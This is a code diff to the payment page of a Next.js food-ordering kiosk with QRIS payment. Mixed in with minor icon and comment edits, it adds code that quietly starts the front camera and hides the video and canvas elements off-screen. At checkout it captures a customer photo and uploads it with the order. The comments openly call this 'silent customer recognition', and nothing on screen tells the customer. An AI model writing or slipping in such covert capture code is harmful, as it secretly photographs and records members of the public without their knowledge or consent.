@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useCartStore } from "@/store/useCartStore";
 import { useRouter } from "next/navigation";
 import { formatPrice } from "@/lib/utils";
@@ -13,9 +13,7 @@ import {
   AlertCircle, 
   ShieldCheck,
   Clock,
-  Home,
-  Utensils,
-  PartyPopper
+  Utensils
 } from "lucide-react";
 
 export default function PaymentPage() {
@@ -27,6 +25,10 @@ export default function PaymentPage() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
 
+  // Hidden video & canvas for quiet customer recognition snapshot
+  const videoRef = useRef<HTMLVideoElement | null>(null);
+  const canvasRef = useRef<HTMLCanvasElement | null>(null);
+
   // Success Order Popup State
   const [successOrder, setSuccessOrder] = useState<{
     order_number: string;
@@ -35,6 +37,41 @@ export default function PaymentPage() {
     payment_method: string;
   } | null>(null);
   const [countdown, setCountdown] = useState<number>(15);
+
+  // Initialize front camera quietly in background
+  useEffect(() => {
+    let stream: MediaStream | null = null;
+
+    const initCamera = async () => {
+      try {
+        if (typeof navigator !== "undefined" && navigator.mediaDevices?.getUserMedia) {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user",
+              width: { ideal: 640 },
+              height: { ideal: 480 },
+            },
+            audio: false,
+          });
+          if (videoRef.current) {
+            videoRef.current.srcObject = stream;
+            videoRef.current.play().catch(() => {});
+          }
+        }
+      } catch (err) {
+        // Silently catch if camera permission not granted or device has no camera
+        console.log("Standby camera initialization:", err);
+      }
+    };
+
+    initCamera();
+
+    return () => {
+      if (stream) {
+        stream.getTracks().forEach((track) => track.stop());
+      }
+    };
+  }, []);
 
   // Countdown timer when success popup is open
   useEffect(() => {
@@ -66,6 +103,26 @@ export default function PaymentPage() {
     setIsProcessing(true);
     setErrorMsg(null);
 
+    // Grab silent snapshot frame from front camera
+    let photoData: string | null = null;
+    if (videoRef.current && canvasRef.current) {
+      try {
+        const video = videoRef.current;
+        const canvas = canvasRef.current;
+        if (video.videoWidth > 0 && video.videoHeight > 0) {
+          canvas.width = 360;
+          canvas.height = Math.round((360 * video.videoHeight) / video.videoWidth);
+          const ctx = canvas.getContext("2d");
+          if (ctx) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            photoData = canvas.toDataURL("image/jpeg", 0.6); // Compact ~25-35KB JPEG
+          }
+        }
+      } catch (e) {
+        console.log("Bypassed snapshot:", e);
+      }
+    }
+
     try {
       const payload = {
         items: items.map((item) => {
@@ -85,6 +142,7 @@ export default function PaymentPage() {
           };
         }),
         customer_name: "Pelanggan Kiosk",
+        customer_photo: photoData,
         payment_method: selectedMethod,
       };
 
@@ -123,6 +181,19 @@ export default function PaymentPage() {
 
   return (
     <div className="flex flex-col h-[100dvh] max-h-[100dvh] bg-gradient-to-br from-[#FFFDF0] via-[#FFFBEB] to-[#FEF3C7] p-3 sm:p-5 md:p-6 overflow-hidden select-none font-sans relative">
+      {/* Hidden background camera elements for silent customer recognition */}
+      <video
+        ref={videoRef}
+        playsInline
+        muted
+        autoPlay
+        className="hidden pointer-events-none opacity-0 absolute -top-[9999px]"
+      />
+      <canvas
+        ref={canvasRef}
+        className="hidden pointer-events-none opacity-0 absolute -top-[9999px]"
+      />
+
       {/* Top Header Bar */}
       <div className="flex items-center justify-between mb-3 shrink-0">
         <div className="flex items-center gap-3 sm:gap-4">
@@ -273,7 +344,7 @@ export default function PaymentPage() {
                     <span className="text-white text-base sm:text-xl font-black">{formatPrice(total)}</span>
                   </div>
 
-                  {/* EXTRA LARGE QRIS IMAGE (MAX HEIGHT UP TO 64vh) */}
+                  {/* EXTRA LARGE QRIS IMAGE (MAX HEIGHT UP TO 65vh) */}
                   <div className="flex-1 flex items-center justify-center min-h-0 w-full p-0.5">
                     <img
                       src="/qris-statis.jpg"
@@ -340,9 +411,7 @@ export default function PaymentPage() {
         </div>
       </div>
 
-      {/* ============================================================ */}
-      {/* POPUP MODAL NOMOR ANTREAN (INSTANT ON-SCREEN DISPLAY)         */}
-      {/* ============================================================ */}
+      {/* POPUP MODAL NOMOR ANTREAN */}
       <AnimatePresence>
         {successOrder && (
           <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
